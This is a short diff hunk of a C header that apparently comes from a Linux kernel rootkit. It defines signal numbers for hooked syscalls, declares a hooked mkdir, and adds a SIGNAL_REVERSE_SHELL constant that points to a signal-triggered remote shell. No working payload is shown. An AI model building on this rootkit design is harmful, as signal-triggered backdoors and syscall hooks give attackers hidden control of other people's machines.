@@ -12,7 +12,7 @@
 
 // Syscalls to be hooked using frace
 #define SIGNAL_KILL_HOOK 50
-
+#define SIGNAL_REVERSE_SHELL 51
 
 //Hooking mkdir
 asmlinkage int hook_mkdir(const struct pt_regs *regs);
